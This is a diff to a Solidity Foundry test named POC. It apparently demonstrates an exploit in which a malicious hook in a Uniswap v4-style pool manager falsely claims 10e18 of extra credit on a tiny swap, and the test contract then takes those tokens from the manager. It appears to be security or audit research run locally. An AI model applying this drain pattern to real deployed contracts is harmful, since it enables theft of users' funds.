@@ -34,7 +34,10 @@ contract POC is Test {
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
         vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
         hook=MaliciousDeltaHook(a);
-        token0.mint(address(this),100e18); token1.mint(address(this),100e18);
+        token0.mint(address(this),100e18); 
+        token1.mint(address(this),100e18);
+        token0.mint(address(manager),100e18);
+        token1.mint(address(manager),100e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
@@ -61,9 +64,7 @@ contract POC is Test {
             if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
             if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
         } else {
-            // swap tiny amount, hook will claim it provided 10e18 extra
             manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            // TAKE AS POC, not via hook.drain - POC holds the credit
             Currency c1 = Currency.wrap(address(token1));
             manager.take(c1, address(this), 10e18);
         }
